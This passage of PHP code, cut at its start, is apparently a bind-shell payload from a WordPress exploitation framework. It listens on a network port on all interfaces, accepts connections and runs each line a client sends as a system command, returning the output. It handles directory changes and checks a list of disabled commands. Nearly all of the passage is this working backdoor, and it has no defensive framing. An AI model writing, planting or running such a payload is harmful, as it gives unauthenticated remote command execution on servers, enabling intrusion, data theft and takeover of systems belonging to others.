    socket_bind($server, '0.0.0.0', $port);
    socket_listen($server, 5);

    while (true) {
        $client = socket_accept($server);
        $cwd = getcwd();
        socket_write($client, "Welcome to the shell. Current directory: $cwd\n", strlen("Welcome to the shell. Current directory: $cwd\n"));

        while (true) {
            $input = socket_read($client, 2048);
            if ($input === false || $input === '') break;

            $input = trim($input);
            if ($input === 'exit' || $input === 'quit') {
                socket_write($client, "Exiting...\n", strlen("Exiting...\n"));
                break;
            } elseif (strpos($input, 'cd') === 0) {
                $dir = substr($input, 2);
                if ($dir === '') {
                    socket_write($client, "Usage: cd <directory>\n", strlen("Usage: cd <directory>\n"));
                } else {
                    if (@chdir($dir)) {
                        $cwd = getcwd();
                        socket_write($client, "Changed directory to $cwd\n", strlen("Changed directory to $cwd\n"));
                    } else {
                        socket_write($client, "Failed to change directory.\n", strlen("Failed to change directory.\n"));
                    }
                }
            } else {
                $command = $input;
                if (!in_array($command, $wpxf_disabled)) {
                    $output = $wpxf_exec($command);
                    socket_write($client, $output . "\n", strlen($output . "\n"));
                } else {
                    socket_write($client, "Command disabled.\n", strlen("Command disabled.\n"));
                }
            }
        }

        socket_close($client);
    }

    socket_close($server);
}

